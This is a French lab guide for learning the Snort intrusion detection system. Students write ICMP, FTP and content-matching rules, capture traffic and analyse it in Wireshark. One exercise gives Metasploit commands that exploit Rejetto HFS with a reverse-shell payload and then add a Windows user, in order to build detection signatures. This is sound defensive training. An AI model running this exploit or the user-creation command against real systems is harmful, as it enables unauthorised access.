# Guide Complet - TP Snort IDS
## Laboratoire de Sécurité des Systèmes Informatiques

---

## 📋 Table des Matières
1. [Objectifs du TP](#objectifs)
2. [Prérequis et Configuration](#prérequis)
3. [Exercice 1: Snort en mode IDS](#exercice-1)
4. [Exercice 2: Snort en mode Logger](#exercice-2)
5. [Exercice 3: Création de Règles Personnalisées](#exercice-3)
6. [Dépannage](#dépannage)

---

## 🎯 Objectifs {#objectifs}

Dans ce TP, vous allez:
- Installer et configurer Snort, un système de détection d'intrusion (IDS)
- Apprendre à écrire des règles Snort pour détecter des activités suspectes
- Analyser le trafic réseau capturé avec Wireshark
- Simuler une attaque et créer des règles personnalisées

---

## 🖥️ Prérequis et Configuration {#prérequis}

### Machines Virtuelles Nécessaires
- **Ubuntu Server** - Installation de Snort
- **Windows Server 2012 R2** - Système cible
- **Kali Linux** - Outils d'attaque

### Vérification Initiale
Assurez-vous que les trois VM sont démarrées et connectées au même réseau.

---

## 🔍 Exercice 1: Snort en Mode IDS {#exercice-1}

### Étape 1: Vérification de l'Installation

Sur **Ubuntu Server**, ouvrez un terminal (`Ctrl+Alt+T`) et vérifiez la version de Snort:

```bash
snort -V
```

**Résultat attendu**: Affichage de la version de Snort installée.

---

### Étape 2: Configuration du Réseau Protégé

1. **Identifier votre configuration réseau**:
```bash
ifconfig
```

2. **Notez les informations suivantes**:
   - Interface réseau (exemple: `eth0`)
   - Adresse IP (exemple: `192.168.132.128`)

3. **Ouvrir le fichier de configuration Snort**:
```bash
sudo gedit /etc/snort/snort.conf
```

4. **Modifier la variable HOME_NET**:
   - Cherchez la ligne `ipvar HOME_NET`
   - Remplacez l'adresse IP par votre sous-réseau (exemple: `192.168.132.0/24`)
   - **Important**: Gardez le `/24` à la fin
   - Sauvegardez (`Ctrl+S`) et fermez

---

### Étape 3: Test de Configuration

Testez la configuration Snort:

```bash
sudo snort -T -i eth0 -c /etc/snort/snort.conf
```

**Options expliquées**:
- `-T`: Mode test de configuration
- `-i eth0`: Interface réseau à surveiller
- `-c`: Chemin du fichier de configuration

**Résultat attendu**: Message confirmant "0 Snort rules read" (aucune règle chargée pour l'instant).

---

### Étape 4: Création de Votre Première Règle

#### Comprendre la Syntaxe des Règles Snort

Une règle Snort se compose de deux parties:

**En-tête de règle**:
```
alert icmp any any -> $HOME_NET any
```
- `alert`: Action (générer une alerte)
- `icmp`: Protocole
- `any any`: IP source et port source (tous)
- `->`: Direction du trafic
- `$HOME_NET any`: IP destination et port destination

**Options de règle**:
```
(msg:"ICMP test"; sid:1000001; classtype:icmp-event;)
```
- `msg`: Message d'alerte
- `sid`: ID unique de la règle (>1000000 pour règles personnalisées)
- `classtype`: Catégorie de la règle

#### Ajouter la Règle ICMP

1. **Ouvrir le fichier de règles locales**:
```bash
sudo gedit /etc/snort/rules/local.rules
```

2. **Ajouter la règle suivante**:
```
alert icmp any any -> $HOME_NET any (msg:"ICMP test"; sid:1000001; classtype:icmp-event;)
```

3. **Sauvegarder et fermer**

4. **Vérifier le chargement de la règle**:
```bash
sudo snort -T -i eth0 -c /etc/snort/snort.conf
```

**Résultat attendu**: Message "1 Snort rules read".

---

### Étape 5: Démarrage de Snort en Mode IDS

Lancez Snort en mode détection:

```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

**Options expliquées**:
- `-A console`: Afficher les alertes dans la console
- `-q`: Mode silencieux (sans bannière)

**Observation**: L'écran semble figé - c'est normal, Snort attend du trafic.

---

### Étape 6: Génération de Trafic ICMP

1. **Sur la VM Kali Linux**:
   - Ouvrez un terminal
   - Tapez `startx` si nécessaire pour démarrer l'interface graphique

2. **Pingez le serveur Ubuntu**:
```bash
ping 192.168.x.x
```
(Remplacez `x.x` par l'IP de votre Ubuntu Server)

3. **Arrêtez après quelques secondes** avec `Ctrl+C`

---

### Étape 7: Observation des Alertes

Retournez sur **Ubuntu Server**.

**Résultat attendu**: Vous devriez voir des alertes s'afficher pour chaque paquet ICMP:
```
[**] [1:1000001:0] ICMP test [**]
```

**Arrêtez Snort** avec `Ctrl+C`.

---

### Étape 8: Règle de Détection FTP

#### Créer une Règle Plus Spécifique

1. **Rouvrir le fichier de règles**:
```bash
sudo gedit /etc/snort/rules/local.rules
```

2. **Désactiver la règle ICMP** (ajoutez `#` au début):
```
# alert icmp any any -> $HOME_NET any (msg:"ICMP test"; sid:1000001; classtype:icmp-event;)
```

3. **Ajouter la nouvelle règle FTP**:
```
alert tcp 192.168.x.x any -> $HOME_NET 21 (msg:"FTP connection attempt"; sid:1000002; rev:1;)
```
(Remplacez `x.x` par l'IP de votre **Kali Linux**)

**Explication**:
- `tcp`: Protocole TCP uniquement
- `192.168.x.x`: IP source spécifique (Kali)
- `21`: Port FTP
- `rev:1`: Numéro de révision

4. **Sauvegarder et fermer**

---

### Étape 9: Test de la Règle FTP avec Logging

Démarrez Snort avec l'option de logging ASCII:

```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0 -K ascii
```

**Nouvelle option**:
- `-K ascii`: Enregistrer les logs au format ASCII (lisible)

---

### Étape 10: Tentative de Connexion FTP

1. **Sur Kali Linux**, tentez une connexion FTP:
```bash
ftp 192.168.x.x
```
(Remplacez `x.x` par l'IP de votre Ubuntu Server)

2. **Observez la sortie** sur Ubuntu Server

**Résultat attendu**: Alerte détectant la tentative de connexion FTP depuis Kali.

3. **Arrêtez Snort** avec `Ctrl+C`

---

### Étape 11: Examen des Logs

#### Lister les Fichiers de Log

```bash
ls /var/log/snort
```

**Vous devriez voir**:
- `snort.log.*` - Fichiers au format pcap
- Répertoire avec l'IP source (Kali Linux)

#### Examiner les Logs ASCII

```bash
sudo ls /var/log/snort/192.168.x.x
```

Affichez le contenu du log TCP:
```bash
sudo cat /var/log/snort/192.168.x.x/TCP:*-21
```

**Résultat**: Détails de la connexion FTP capturée.

---

### Étape 12: Analyse avec Wireshark

1. **Lancer Wireshark**:
```bash
sudo wireshark
```

2. **Ignorer les avertissements** (cliquez OK)

3. **Ouvrir un fichier de capture**:
   - Menu: `File` → `Open`
   - Naviguez vers `/var/log/snort`
   - Sélectionnez `snort.log.*`
   - Cliquez `Open`

4. **Explorer les paquets**:
   - Cliquez sur un paquet
   - Développez les sections dans le panneau du milieu
   - Examinez les détails de chaque couche protocole

5. **Fermez Wireshark** quand vous avez terminé

---

### Étape 13: Règle de Détection de Contenu

#### Préparer le Test

1. **Sur Windows Server 2012 R2**:
   - Connectez-vous
   - Trouvez l'adresse IP:
   ```cmd
   ipconfig
   ```
   - Notez l'adresse IP

2. **Sur Ubuntu Server**, tentez une connexion FTP invalide:
```bash
ftp 192.168.x.x
```
(IP de Windows Server)

3. **Appuyez sur Entrée** pour le nom et mot de passe (laisser vide)

4. **Observez le message d'erreur**: `"Login or password incorrect"`

5. **Quittez FTP**:
```bash
quit
```

---

### Étape 14: Créer une Règle de Détection d'Échec de Connexion

1. **Ouvrir les règles locales** (gardez la fenêtre ouverte):
```bash
sudo gedit /etc/snort/rules/local.rules
```

2. **Ajouter la règle suivante**:
```
alert tcp $HOME_NET 21 -> any any (msg:"FTP failed login"; content:"Login or password incorrect"; sid:1000003; rev:1;)
```

**Points importants**:
- `$HOME_NET 21`: Source = notre réseau, port 21 (serveur FTP)
- `-> any any`: Vers n'importe quelle destination
- `content:"..."`: Recherche de texte spécifique dans le paquet

3. **Sauvegarder** (gardez le fichier ouvert)

---

### Étape 15: Test de la Règle de Contenu

1. **Démarrer Snort** (dans un nouveau terminal):
```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

2. **Sur Kali Linux**, tentez une connexion FTP au Windows Server:
```bash
ftp 192.168.x.x
```

3. **Entrez des identifiants invalides**

4. **Quittez avec** `quit`

5. **Retournez sur Ubuntu Server**

**Résultat attendu**: Plusieurs alertes générées par les différentes règles actives.

6. **Arrêtez Snort** avec `Ctrl+C`

---

## 📦 Exercice 2: Snort en Mode Logger et Simulation d'Attaque {#exercice-2}

### Objectif
Capturer le trafic d'une vraie attaque, puis analyser les paquets pour créer une règle de détection.

---

### Étape 1: Configuration de l'Exploit Metasploit

1. **Sur Kali Linux**, lancez Metasploit:
```bash
msfconsole
```

**Attendez le chargement** (cela prend environ 30 secondes).

2. **Configurez l'exploit** (entrez les commandes une par une):
```bash
use exploit/windows/http/rejetto_hfs_exec
set PAYLOAD windows/shell/reverse_tcp
set LHOST 192.168.x.x
```
(Remplacez par l'IP de **Kali Linux**)

```bash
set RHOST 192.168.x.x
```
(Remplacez par l'IP de **Windows Server**)

```bash
set RPORT 8081
```

**Ce que fait cet exploit**: Exploite une vulnérabilité dans le serveur HTTP Rejetto HFS pour obtenir un shell distant.

---

### Étape 2: Démarrage de Snort en Mode Logging

**Sur Ubuntu Server**, lancez Snort en mode capture:

```bash
sudo snort -dev -q -l /var/log/snort -i eth0
```

**Options expliquées**:
- `-d`: Dump du contenu des paquets
- `-e`: Afficher les en-têtes Ethernet
- `-v`: Mode verbeux
- `-l`: Répertoire de logging

**Observation**: Snort capture maintenant tout le trafic.

---

### Étape 3: Exécution de l'Attaque

1. **Sur Kali Linux** (dans msfconsole), lancez l'exploit:
```bash
exploit
```

**Résultat attendu**: Après quelques secondes, vous obtenez un shell Windows:
```
Microsoft Windows [Version ...]
C:\Users\Administrator\Desktop\hfs2.3b>
```

2. **Créez un nouvel utilisateur**:
```cmd
net user votrenom P@ssword12 /ADD
```

3. **Changez de répertoire**:
```cmd
cd \
```

4. **Créez un dossier à votre nom**:
```cmd
mkdir votrenom
```

5. **Fermez le shell**:
   - Appuyez sur `Ctrl+C`
   - Tapez `y` pour confirmer

---

### Étape 4: Arrêt de la Capture

**Sur Ubuntu Server**:
- Appuyez sur `Ctrl+C` pour arrêter Snort

---

### Étape 5: Analyse avec Wireshark

1. **Lancer Wireshark**:
```bash
sudo wireshark
```

2. **Ouvrir la capture récente**:
   - `File` → `Open`
   - Naviguez vers `/var/log/snort`
   - Sélectionnez le fichier `snort.log.*` le plus récent
   - Cliquez `Open`

**Observation**: Vous voyez des centaines de paquets capturés.

---

### Étape 6: Recherche de l'Activité Malveillante

1. **Ouvrir la fonction de recherche**:
   - Menu: `Edit` → `Find Packet` (ou `Ctrl+F`)

2. **Configurer la recherche**:
   - Sélectionnez `String`
   - Dans "Search In", choisissez `Packet Bytes`
   - Entrez le nom d'utilisateur que vous avez créé
   - Cliquez `Find`

**Résultat**: Wireshark trouve et sélectionne le paquet contenant votre commande.

---

### Étape 7: Suivi du Flux TCP

1. **Avec le paquet sélectionné** (surligné en orange foncé):
   - Clic droit → `Follow` → `TCP Stream`

2. **Observez la fenêtre qui s'ouvre**:
   - Vous voyez TOUTES les commandes tapées durant l'attaque
   - La création d'utilisateur
   - La navigation dans les dossiers
   - Toutes les actions de l'attaquant

**C'est l'empreinte complète de l'attaque!**

3. **Fermez la fenêtre du flux TCP**

---

### Étape 8: Identification de la Signature d'Attaque

1. **Dans la liste des paquets**, utilisez les flèches ↑ pour remonter

2. **Cherchez dans le panneau du bas** (ASCII dump) le texte:
```
C:\Users\Administrator\Desktop\hfs2.3b>
```

3. **Observez la partie hexadécimale** correspondante (panneau du milieu)

**Pourquoi est-ce important?**
Ce chemin spécifique indique qu'un shell a été obtenu via l'exploit Rejetto HFS. C'est notre signature d'attaque!

4. **Minimisez Wireshark** (ne fermez pas)

---

## 🛡️ Exercice 3: Création de Règle Personnalisée {#exercice-3}

### Étape 1: Règle Basée sur du Contenu Texte

1. **Ouvrir les règles locales**:
```bash
sudo gedit /etc/snort/rules/local.rules
```

2. **Ajouter la règle suivante** (notez les backslashes échappés `\\`):
```
alert tcp $HOME_NET any -> any any (msg:"Command Shell Access"; content:"C:\\Users\\Administrator\\Desktop\\hfs2.3b"; sid:1000004; rev:1;)
```

**Explication**:
- Détecte le trafic sortant de notre réseau
- Recherche la chaîne caractéristique du shell Rejetto
- Chaque `\` doit être échappé avec `\\`

3. **Sauvegarder**

4. **Démarrer Snort**:
```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

---

### Étape 2: Test de la Règle Texte

1. **Sur Kali Linux** (dans msfconsole):
```bash
exploit
```

2. **Attendez l'obtention du shell**

3. **Retournez sur Ubuntu Server**

**Résultat attendu**: Multiples alertes "Command Shell Access" s'affichent!

4. **Arrêtez le shell** (`Ctrl+C` + `y` sur Kali)

5. **Arrêtez Snort** (`Ctrl+C` sur Ubuntu)

---

### Étape 3: Règle Basée sur du Contenu Hexadécimal

#### Pourquoi utiliser l'hexadécimal?
Parfois le contenu malveillant n'est pas du texte lisible (binaire, encodé, obfusqué). L'hexadécimal permet de détecter ces patterns.

---

### Étape 4: Copie de la Règle et Modification

1. **Dans le fichier local.rules**:
   - Copiez la règle `sid:1000004`
   - Collez-la sur une nouvelle ligne
   - Commentez l'ancienne (`#` au début)
   - Changez `rev:1` en `rev:2` sur la nouvelle

**Résultat**:
```
# alert tcp $HOME_NET any -> any any (msg:"Command Shell Access"; content:"C:\\Users\\Administrator\\Desktop\\hfs2.3b"; sid:1000004; rev:1;)
alert tcp $HOME_NET any -> any any (msg:"Command Shell Access"; content:"C:\\Users\\Administrator\\Desktop\\hfs2.3b"; sid:1000004; rev:2;)
```

---

### Étape 5: Extraction du Contenu Hexadécimal

1. **Retournez sur Wireshark** (la fenêtre minimisée)

2. **Sélectionnez le paquet** avec le contenu `C:\Users\Administrator\Desktop\hfs2.3b>`

3. **Dans le panneau du milieu**, sélectionnez la ligne "Data" qui contient ce texte

4. **Clic droit sur la sélection**:
   - `Copy` → `Bytes` → `Offset Hex`

**Résultat**: Les valeurs hexadécimales sont copiées dans le presse-papier.

---

### Étape 6: Intégration de l'Hexadécimal dans la Règle

1. **Dans le fichier local.rules**:

2. **Sélectionnez le contenu entre guillemets** dans la nouvelle règle:
```
"C:\\Users\\Administrator\\Desktop\\hfs2.3b"
```

3. **Cliquez droit** → `Paste`

4. **Nettoyez le contenu collé**:
   - Supprimez tous les espaces
   - Supprimez les retours à la ligne
   - Supprimez les numéros d'offset (début de ligne)
   - Gardez UNIQUEMENT les valeurs hexadécimales

5. **Encadrez avec des pipes** `|valeurs_hex|`

**Exemple de résultat final**:
```
alert tcp $HOME_NET any -> any any (msg:"Command Shell Access"; content:"|43 3a 5c 55 73 65 72 73 5c 41 64 6d 69 6e 69 73 74 72 61 74 6f 72 5c 44 65 73 6b 74 6f 70 5c 68 66 73 32 2e 33 62|"; sid:1000004; rev:2;)
```

6. **Sauvegarder**

---

### Étape 7: Test de la Règle Hexadécimale

1. **Démarrer Snort**:
```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

2. **Sur Kali Linux**, relancez l'exploit:
```bash
exploit
```

3. **Observez Ubuntu Server**

**Résultat**: Cette fois, seulement 2 alertes au lieu de 4!

**Pourquoi?** La règle hexadécimale inclut le caractère `>` qui apparaît moins souvent, rendant la règle plus précise.

4. **Arrêtez tout**:
   - `Ctrl+C` + `y` sur Kali
   - `Ctrl+C` sur Ubuntu
   - `exit` dans msfconsole sur Kali

---

## 🔧 Dépannage {#dépannage}

### Problème: "0 Snort rules read"
**Solution**: Vérifiez que vous avez bien sauvegardé le fichier `local.rules`.

### Problème: Erreur "Permission denied"
**Solution**: Utilisez `sudo` devant vos commandes.

### Problème: Interface réseau introuvable
**Solution**: Vérifiez le nom avec `ifconfig` et utilisez le bon nom (eth0, ens33, etc.).

### Problème: Pas d'alertes générées
**Solutions**:
- Vérifiez que les IP dans les règles correspondent à vos VM
- Assurez-vous que Snort est en cours d'exécution
- Vérifiez que le trafic passe bien par l'interface surveillée

### Problème: Wireshark n'affiche rien
**Solution**: Vérifiez que des fichiers `.pcap` existent dans `/var/log/snort`.

### Problème: L'exploit Metasploit échoue
**Solutions**:
- Vérifiez les IP configurées (LHOST, RHOST)
- Assurez-vous que le serveur HFS tourne sur Windows Server
- Vérifiez la connectivité réseau entre les VM

---

## 📚 Concepts Clés à Retenir

### Structure d'une Règle Snort
```
action protocol source_ip source_port direction dest_ip dest_port (options)
```

### Actions Principales
- `alert`: Génère une alerte
- `log`: Enregistre le paquet
- `pass`: Ignore le paquet
- `drop`: Bloque le paquet (mode IPS)

### Options Importantes
- `msg`: Message de l'alerte
- `sid`: ID unique (> 1000000 pour règles custom)
- `rev`: Numéro de révision
- `content`: Contenu à rechercher
- `classtype`: Catégorie de la règle

### Modes de Snort
- **Sniffer** (`-v`): Affiche les paquets
- **Logger** (`-l`): Enregistre les paquets
- **IDS** (`-c`): Détecte selon des règles

---

## ✅ Checklist de Fin de TP

- [ ] Snort installé et configuré
- [ ] HOME_NET correctement défini
- [ ] Règle ICMP créée et testée
- [ ] Règle FTP créée et testée
- [ ] Règle de contenu texte créée
- [ ] Attaque Metasploit exécutée
- [ ] Trafic capturé et analysé avec Wireshark
- [ ] Règle hexadécimale créée et testée
- [ ] Logs examinés (ASCII et PCAP)

---

## 🎓 Conclusion

Vous avez maintenant les compétences pour:
- Configurer un IDS Snort
- Écrire des règles de détection personnalisées
- Analyser du trafic réseau malveillant
- Identifier des signatures d'attaque
- Créer des règles basées sur du contenu texte et hexadécimal

**Prochaines étapes**: Explorez les règles communautaires Snort, apprenez à optimiser les performances, et expérimentez avec d'autres types d'attaques!

---
